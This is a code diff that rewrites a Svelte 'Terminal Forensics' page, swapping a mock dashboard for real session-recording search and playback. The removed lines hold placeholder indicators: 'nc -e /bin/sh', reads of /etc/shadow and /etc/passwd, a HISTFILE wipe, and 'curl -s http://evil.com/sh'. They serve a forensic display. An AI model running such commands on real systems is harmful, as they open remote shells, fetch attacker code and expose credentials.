@@ -1,79 +1,71 @@
-<!--
-  OBLIVRA — Terminal Forensics (Svelte 5)
-  Deep inspection of terminal streams and command lineage.
--->
+<!-- Terminal Forensics — search session recordings + jump to playback. Uses RecordingService. -->
 <script lang="ts">
-  import { KPI, PageLayout, Button, Badge, DataTable } from '@components/ui';
+  import { onMount } from 'svelte';
+  import { PageLayout, KPI, Button, DataTable, PopOutButton } from '@components/ui';
+  import { Microscope, RefreshCw, Search, Play } from 'lucide-svelte';
+  import { IS_BROWSER } from '@lib/context';
+  import { push } from '@lib/router.svelte';
+  import { appStore } from '@lib/stores/app.svelte';
 
-  const artifacts: Record<string, any>[] = [
-    { id: 'A-11', type: 'Env Var', name: 'HISTFILE', value: '/dev/null', risk: 'high' },
-    { id: 'A-12', type: 'File op', name: '/etc/shadow', value: 'Read attempt', risk: 'critical' },
-    { id: 'A-13', type: 'Pipe', name: 'nc -e /bin/sh', value: 'Outbound stream', risk: 'critical' },
-  ];
+  let recordings = $state<any[]>([]);
+  let query = $state('');
+  let hits = $state<any[]>([]);
+  let loading = $state(false);
+
+  async function refresh() {
+    loading = true;
+    try {
+      if (IS_BROWSER) return;
+      const { ListRecordings } = await import('@wailsjs/github.com/kingknull/oblivrashell/internal/services/recordingservice');
+      recordings = ((await ListRecordings()) ?? []) as any[];
+    } finally { loading = false; }
+  }
+
+  async function search() {
+    if (!query.trim()) { hits = []; return; }
+    try {
+      const { SearchRecordings } = await import('@wailsjs/github.com/kingknull/oblivrashell/internal/services/recordingservice');
+      hits = ((await SearchRecordings(query)) ?? []) as any[];
+    } catch (e: any) {
+      appStore.notify(`Search failed: ${e?.message ?? e}`, 'error');
+    }
+  }
+  onMount(refresh);
 </script>
 
-<PageLayout title="Terminal Forensics" subtitle="Deep inspection of command lineage and artifact leakage">
+<PageLayout title="Terminal Forensics" subtitle="Search and replay recorded shell sessions">
   {#snippet toolbar()}
-    <div class="flex items-center gap-2">
-      <Button variant="secondary" size="sm">Export Timeline</Button>
-      <Button variant="cta" size="sm">Audit Lock</Button>
-    </div>
+    <Button variant="secondary" size="sm" icon={RefreshCw} onclick={refresh}>{loading ? 'Loading…' : 'Refresh'}</Button>
+    <PopOutButton route="/terminal-forensics" title="Terminal Forensics" />
   {/snippet}
-
-  <div class="flex flex-col h-full gap-6">
-    <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
-      <KPI label="Command Entropy" value="High" trend="stable" trendValue="Anomalous" variant="critical" />
-      <KPI label="Detected Shells" value="3" trend="stable" trendValue="Isolated" variant="warning" />
-      <KPI label="Data Leakage" value="None" trend="stable" trendValue="Optimal" variant="success" />
-      <KPI label="Integrity Score" value="98%" trend="stable" trendValue="Verified" />
+  <div class="flex flex-col h-full gap-4">
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-3">
+      <KPI label="Recorded Sessions" value={recordings.length.toString()} variant="accent" />
+      <KPI label="Search Hits" value={hits.length.toString()} variant={hits.length > 0 ? 'warning' : 'muted'} />
+      <KPI label="Mode" value={IS_BROWSER ? 'Browser' : 'Desktop'} variant="muted" />
     </div>
-
-    <div class="flex-1 min-h-0 grid grid-cols-1 lg:grid-cols-3 gap-6">
-      <!-- Artifacts Table -->
-      <div class="lg:col-span-2 bg-surface-1 border border-border-primary rounded-md overflow-hidden flex flex-col">
-        <div class="p-3 bg-surface-2 border-b border-border-primary text-[10px] font-bold uppercase tracking-widest text-text-muted">Extracted Forensic Artifacts</div>
-        <div class="flex-1 overflow-auto">
-          <DataTable data={artifacts} columns={[
-            { key: 'type', label: 'Artifact Type', width: '120px' },
-            { key: 'name', label: 'Indicator' },
-            { key: 'value', label: 'Context' },
-            { key: 'risk', label: 'Priority', width: '100px' }
-          ]} compact>
-            {#snippet render({ col: column, row })}
-              {#if column.key === 'risk'}
-                <Badge variant={row.risk === 'critical' ? 'critical' : row.risk === 'high' ? 'warning' : 'info'}>
-                  {row.risk}
-                </Badge>
-              {:else if column.key === 'type'}
-                <span class="text-[9px] font-bold text-text-muted uppercase">{row.type}</span>
-              {:else}
-                <span class="text-[11px] text-text-secondary">{row[column.key]}</span>
-              {/if}
-            {/snippet}
-          </DataTable>
-        </div>
+    <div class="bg-surface-1 border border-border-primary rounded-md p-3 flex items-center gap-2">
+      <Search size={14} class="text-text-muted" />
+      <input class="flex-1 bg-surface-2 border border-border-primary rounded px-2 py-1.5 text-xs outline-none focus:border-accent" placeholder="Search across all session content (e.g. 'sudo rm')" bind:value={query} onkeydown={(e) => e.key === 'Enter' && search()} />
+      <Button variant="cta" size="sm" onclick={search}>Search</Button>
+    </div>
+    <div class="flex-1 bg-surface-1 border border-border-primary rounded-md overflow-hidden">
+      <div class="flex items-center gap-2 p-3 border-b border-border-primary">
+        <Microscope size={14} class="text-accent" />
+        <span class="text-[10px] uppercase tracking-widest font-bold">{hits.length > 0 ? 'Search Hits' : 'All Recordings'}</span>
       </div>
-
-      <!-- Command History Lineage -->
-      <div class="bg-surface-1 border border-border-primary rounded-md p-4 flex flex-col gap-4">
-        <div class="text-[10px] font-bold text-text-muted uppercase tracking-widest border-b border-border-primary pb-2">Command Lineage</div>
-        <div class="flex-1 space-y-4 overflow-y-auto">
-          {#each Array(5) as _, i}
-            <div class="flex items-start gap-3 relative">
-              {#if i < 4}
-                <div class="absolute left-1.5 top-4 bottom-0 w-px bg-border-secondary"></div>
-              {/if}
-              <div class="w-3 h-3 rounded-full bg-accent shrink-0 mt-1 z-10 border-2 border-surface-1"></div>
-              <div class="flex flex-col gap-1">
-                <span class="text-[10px] text-text-muted font-mono">08:14:{12 + i * 2}</span>
-                <code class="text-[11px] font-bold text-text-heading bg-black/20 p-1 rounded-sm border border-white/5">
-                  {i === 0 ? 'ps aux | grep root' : i === 1 ? 'cat /etc/passwd' : 'curl -s http://evil.com/sh'}
-                </code>
-              </div>
-            </div>
-          {/each}
-        </div>
-      </div>
+      <DataTable data={hits.length > 0 ? hits : recordings} columns={[
+        { key: 'title',    label: 'Title' },
+        { key: 'host_label', label: 'Host', width: '140px' },
+        { key: 'started_at', label: 'When', width: '160px' },
+        { key: 'play',     label: '',     width: '60px' },
+      ]} compact>
+        {#snippet render({ col, row })}
+          {#if col.key === 'play'}<Button variant="ghost" size="xs" onclick={() => push(`/session-playback?id=${row.id}`)}><Play size={11} /></Button>
+          {:else if col.key === 'started_at'}<span class="font-mono text-[10px] text-text-muted">{(row.started_at ?? '').slice(0, 19)}</span>
+          {:else}<span class="text-[11px]">{row[col.key] ?? '—'}</span>{/if}
+        {/snippet}
+      </DataTable>
     </div>
   </div>
 </PageLayout>
